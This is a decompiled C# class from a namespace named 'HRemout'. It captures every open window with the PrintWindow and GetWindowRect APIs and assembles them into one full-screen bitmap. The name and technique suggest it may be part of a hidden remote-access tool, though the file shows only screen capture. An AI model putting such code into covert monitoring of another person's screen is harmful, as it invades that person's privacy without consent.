using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace HRemout;

internal class PrintAllWindow
{
	private struct RECT
	{
		private int left;

		private int top;

		private int right;

		private int bottom;

		public int Left => left;

		public int Top => top;

		public int Width => right - left;

		public int Height => bottom - top;

		public static implicit operator Rectangle(RECT rect)
		{
			return new Rectangle(rect.left, rect.top, rect.Width, rect.Height);
		}
	}

	public static Size resolution = Screen.get_PrimaryScreen().get_Bounds().Size;

	public static Bitmap save = new Bitmap(resolution.Width, resolution.Height);

	[DllImport("user32")]
	private static extern int PrintWindow(IntPtr hWnd, IntPtr dc, uint flags);

	[DllImport("user32")]
	private static extern int GetWindowRect(IntPtr hWnd, ref RECT rect);

	public static Rectangle GetWindowPlacement(IntPtr hWnd)
	{
		RECT rect = default(RECT);
		GetWindowRect(hWnd, ref rect);
		return rect;
	}

	public static Bitmap GetWindowhImage()
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		try
		{
			foreach (IntPtr item in Program.Window(revers: true))
			{
				Bitmap val = new Bitmap(GetWindowPlacement(item).Size.Width, GetWindowPlacement(item).Size.Height);
				Graphics obj = Graphics.FromImage((Image)(object)val);
				obj.set_CompositingQuality((CompositingQuality)1);
				obj.set_InterpolationMode((InterpolationMode)1);
				obj.set_SmoothingMode((SmoothingMode)3);
				IntPtr hdc = obj.GetHdc();
				PrintWindow(item, hdc, 0u);
				obj.ReleaseHdc();
				Graphics obj2 = Graphics.FromImage((Image)(object)save);
				obj2.set_CompositingQuality((CompositingQuality)1);
				obj2.set_InterpolationMode((InterpolationMode)1);
				obj2.set_SmoothingMode((SmoothingMode)3);
				obj2.DrawImage((Image)(object)val, GetWindowPlacement(item).X, GetWindowPlacement(item).Y, ((Image)val).get_Width(), ((Image)val).get_Height());
			}
			return save;
		}
		catch
		{
			return null;
		}
	}
}
